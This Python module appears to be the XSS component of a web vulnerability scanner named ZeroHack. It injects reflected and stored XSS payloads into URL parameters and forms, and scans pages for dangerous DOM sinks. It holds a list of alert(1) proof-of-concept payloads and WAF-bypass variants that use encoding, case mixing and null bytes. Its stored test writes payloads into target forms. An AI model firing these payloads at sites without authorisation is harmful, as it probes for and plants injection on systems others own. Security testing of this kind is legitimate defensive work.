"""
ZeroHack v2.0 - XSS Tester
Covers: Reflected XSS, Stored XSS, DOM-based pattern scanning, WAF bypass variants.
"""

import re
import hashlib
from typing import List
from urllib.parse import urlparse, parse_qs

from modules.enhanced_scanner import BaseScanner
from modules.notification_system import Finding, print_module_start, print_finding, print_info

# ─────────────────────────────────────────────────────────────
# Payload libraries
# ─────────────────────────────────────────────────────────────
REFLECTED_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
]

# WAF bypass variants
BYPASS_PAYLOADS = [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<img src=x oNeRrOr=alert(1)>",
    "<<script>alert(1)//<</script>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
    "<svg/onload=&#x61;lert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",   # URL encoded
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entity encoded
    "<scr\x00ipt>alert(1)</scr\x00ipt>",   # null-byte
    "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>",
    "';alert(1)//",
    "\";alert(1)//",
]

# Stored XSS — unique marker approach
STORED_MARKER_TEMPLATE = "<img src=x onerror=\"console.log('{marker}')\">"

# DOM sinks that indicate potential DOM XSS
DOM_SINK_PATTERNS = [
    r"document\.write\s*\(",
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"eval\s*\(",
    r"setTimeout\s*\(",
    r"setInterval\s*\(",
    r"location\.hash",
    r"location\.search",
    r"document\.referrer",
    r"document\.URL",
    r"window\.name",
]


class XSSTester(BaseScanner):
    """
    XSS vulnerability scanner.
    Tests reflected, stored, and DOM-based XSS across URL params and forms.
    """

    MODULE = "XSS"

    def scan(self, mode: str = "both") -> List[Finding]:
        print_module_start(self.MODULE, self.target)
        self.findings.clear()

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        param_names = list(params.keys()) or ["q", "search", "s", "query", "input", "name"]

        # Fetch page for form discovery and DOM analysis
        resp = self.get(self.target)
        forms = []
        if resp:
            forms = self.extract_forms(resp.text, self.target)
            print_info(f"Found {len(forms)} form(s) | {len(param_names)} URL param(s)")

            # DOM-based XSS scan
            self._test_dom_xss(resp.text)

        # Reflected XSS on GET params
        self._test_reflected_get(param_names)

        # Reflected XSS on forms
        for form in forms:
            self._test_reflected_form(form)

        # Stored XSS on forms (post then re-check)
        for form in forms:
            self._test_stored_form(form)

        return self.get_findings()

    # ─────── Reflected XSS — GET params ──────────────────────
    def _test_reflected_get(self, params: List[str]):
        all_payloads = REFLECTED_PAYLOADS + BYPASS_PAYLOADS
        for param in params:
            for payload in all_payloads:
                url = self.inject_param(self.target, param, payload)
                resp = self.get(url)
                if not resp:
                    continue

                # Check if payload is reflected unescaped in response
                if payload in resp.text or self._is_reflected(payload, resp.text):
                    f = self.add_finding(
                        module=self.MODULE,
                        title="Reflected XSS",
                        severity="HIGH",
                        description=(
                            f"Parameter '{param}' reflects unsanitized user input into the HTML response, "
                            "allowing JavaScript execution in the victim's browser."
                        ),
                        target=url,
                        evidence=f"Payload: {payload!r} found unescaped in response body",
                        remediation=(
                            "Encode all user-supplied output using context-aware escaping "
                            "(HTML, JS, URL context). Implement a Content Security Policy (CSP)."
                        ),
                        owasp="A03:2021 – Injection (XSS)",
                        cve="CWE-79",
                    )
                    print_finding(f)
                    break  # one per param is enough

    # ─────── Reflected XSS — Forms ────────────────────────────
    def _test_reflected_form(self, form: dict):
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "image", "reset"):
                continue
            for payload in REFLECTED_PAYLOADS[:5]:
                data = {i["name"]: i["value"] for i in inputs}
                data[inp["name"]] = payload

                resp = self.post(action, data=data) if method == "POST" else self.get(action, params=data)
                if not resp:
                    continue

                if payload in resp.text or self._is_reflected(payload, resp.text):
                    f = self.add_finding(
                        module=self.MODULE,
                        title="Reflected XSS (Form Input)",
                        severity="HIGH",
                        description=(
                            f"Form input '{inp['name']}' at {action} reflects payload without sanitization."
                        ),
                        target=action,
                        evidence=f"Payload: {payload!r} reflected in {method} response",
                        remediation="Sanitize and encode all output. Use a templating engine with auto-escaping.",
                        owasp="A03:2021 – Injection (XSS)",
                    )
                    print_finding(f)
                    break

    # ─────── Stored XSS ───────────────────────────────────────
    def _test_stored_form(self, form: dict):
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        # Generate a unique marker per form submission
        marker = hashlib.md5(action.encode()).hexdigest()[:8]
        payload = STORED_MARKER_TEMPLATE.format(marker=marker)

        text_inputs = [i for i in inputs if i["type"] not in ("submit", "button", "image", "reset", "file")]
        if not text_inputs:
            return

        # Submit with marker in all text inputs
        data = {i["name"]: i["value"] for i in inputs}
        for inp in text_inputs:
            data[inp["name"]] = payload

        if method == "POST":
            self.post(action, data=data)
        else:
            self.get(action, params=data)

        # Re-fetch the page to see if payload was stored
        resp = self.get(self.target)
        if resp and marker in resp.text:
            f = self.add_finding(
                module=self.MODULE,
                title="Stored XSS",
                severity="CRITICAL",
                description=(
                    f"Form at {action} stores and re-renders user input without sanitization. "
                    f"Stored XSS marker '{marker}' found on re-fetch of the target page."
                ),
                target=action,
                evidence=f"Marker {marker!r} persisted and reflected on {self.target}",
                remediation=(
                    "Sanitize stored content before rendering. "
                    "Use a Content Security Policy. Validate and encode data on output."
                ),
                owasp="A03:2021 – Injection (XSS)",
            )
            print_finding(f)

    # ─────── DOM XSS ─────────────────────────────────────────
    def _test_dom_xss(self, html: str):
        found_sinks = []
        for pattern in DOM_SINK_PATTERNS:
            matches = re.findall(pattern, html)
            if matches:
                found_sinks.extend(matches)

        if found_sinks:
            unique_sinks = list(set(found_sinks))[:5]
            f = self.add_finding(
                module=self.MODULE,
                title="Potential DOM-based XSS (Dangerous Sinks Detected)",
                severity="MEDIUM",
                description=(
                    "The page's JavaScript uses dangerous DOM sinks that may execute attacker-controlled input. "
                    "Manual verification is required to confirm exploitability."
                ),
                target=self.target,
                evidence=f"Sinks found: {', '.join(unique_sinks)}",
                remediation=(
                    "Avoid passing user-controlled data to dangerous sinks. "
                    "Use textContent instead of innerHTML. Implement a strict CSP."
                ),
                owasp="A03:2021 – Injection (DOM XSS)",
                cve="CWE-79",
            )
            print_finding(f)

    # ─────── Helper: check reflection accounting for encoding ─
    @staticmethod
    def _is_reflected(payload: str, body: str) -> bool:
        """Check if key parts of payload appear in response."""
        # Check for script tag core
        if "<script>" in payload.lower() and "script" in body.lower():
            return True
        # Check for event handler
        if "onerror" in payload.lower() and "onerror" in body.lower():
            return True
        if "onload" in payload.lower() and "onload" in body.lower():
            return True
        return False
